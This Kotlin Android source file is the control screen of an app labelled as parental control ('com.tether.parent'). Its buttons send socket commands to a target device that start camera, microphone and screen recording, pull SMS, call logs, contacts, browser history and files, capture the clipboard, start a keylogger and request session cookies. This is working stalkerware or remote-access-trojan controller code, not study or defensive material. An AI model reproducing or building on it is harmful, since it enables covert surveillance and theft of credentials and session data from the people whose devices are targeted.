package com.tether.parent.ui.control

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.TextView
import android.widget.Toast
import androidx.core.content.ContextCompat
import androidx.fragment.app.Fragment
import com.tether.parent.R
import com.tether.parent.network.SocketManager
import org.json.JSONObject

class DeviceFeatureFragment : Fragment() {

    companion object {
        private const val ARG_ID = "device_id"
        private const val ARG_NAME = "device_name"
        private const val ARG_ONLINE = "device_online"

        fun newInstance(deviceId: String, deviceName: String, isOnline: Boolean): DeviceFeatureFragment {
            val args = Bundle().apply {
                putString(ARG_ID, deviceId)
                putString(ARG_NAME, deviceName)
                putBoolean(ARG_ONLINE, isOnline)
            }
            return DeviceFeatureFragment().apply { arguments = args }
        }
    }

    private var deviceId = ""
    private var deviceNameArg = ""
    private var isOnline = false

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        deviceId = arguments?.getString(ARG_ID) ?: ""
        deviceNameArg = arguments?.getString(ARG_NAME) ?: ""
        isOnline = arguments?.getBoolean(ARG_ONLINE) ?: false
        return inflater.inflate(R.layout.fragment_device_feature, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        val deviceName = view.findViewById<TextView>(R.id.deviceName)
        val deviceStatus = view.findViewById<TextView>(R.id.deviceStatus)
        val btnBack = view.findViewById<View>(R.id.btnBack)

        deviceName.text = deviceNameArg
        deviceStatus.text = if (isOnline) "● ACTIVE" else "● SLEEP"
        deviceStatus.setTextColor(ContextCompat.getColor(requireContext(),
            if (isOnline) R.color.neon_cyan else R.color.text_dim))

        btnBack.setOnClickListener {
            parentFragmentManager.popBackStack()
        }

        setupFeatureListeners(view)
    }

    private fun setupFeatureListeners(view: View) {
        val socket = SocketManager.getInstance()

        // Map button IDs to emit events + extra data builder
        data class Feature(val event: String, val extra: (JSONObject.() -> Unit)? = null)

        val features = mapOf(
            R.id.btnFeatureLocation to Feature("location:request"),
            R.id.btnFeatureCamera to Feature("camera:start"),
            R.id.btnFeatureVoice to Feature("voice:start"),
            R.id.btnFeatureLock to Feature("screen:lock") { put("reason", "Locked by parent") },
            R.id.btnFeatureMessages to Feature("sms:request-logs"),
            R.id.btnFeatureFlash to Feature("flashlight:on"),
            R.id.btnFeatureAppUsage to Feature("app:usage:start"),
            R.id.btnFeatureHistory to Feature("browser:history:request"),
            R.id.btnFeatureCallLogs to Feature("call:request"),
            R.id.btnFeatureSIM to Feature("sim:request"),
            R.id.btnFeatureClipboard to Feature("clipboard:start"),
            R.id.btnFeatureKeylog to Feature("keylog:start"),
            R.id.btnFeatureBattery to Feature("battery:monitor:start"),
            R.id.btnFeatureRing to Feature("device:ring"),
            R.id.btnFeatureNotify to Feature("notify:send") { put("title", "Message"); put("body", "Hello!"); put("priority", "normal") },
            R.id.btnFeatureFiles to Feature("file:list") { put("path", "/storage/emulated/0") },
            R.id.btnFeatureContacts to Feature("contacts:request"),
            R.id.btnFeatureRecord to Feature("screen:recording:start") { put("maxDuration", 30000); put("quality", "medium") },
            R.id.btnFeatureNetwork to Feature("wifi:request"),
            R.id.btnFeatureSession to Feature("session:request-cookies")
            // btnFeatureShell DIHAPUS — fitur butuh root, sangat terbatas tanpa root
        )

        for ((btnId, feat) in features) {
            view.findViewById<View>(btnId).setOnClickListener {
                if (!socket.isSocketConnected()) {
                    Toast.makeText(context, "SYS: OFFLINE", Toast.LENGTH_SHORT).show()
                    return@setOnClickListener
                }
                val data = JSONObject().apply {
                    put("targetDeviceId", deviceId)
                    feat.extra?.invoke(this)
                }
                socket.emit(feat.event, data)
                Toast.makeText(context, "CMD: ${feat.event}", Toast.LENGTH_SHORT).show()
            }
        }
    }
}
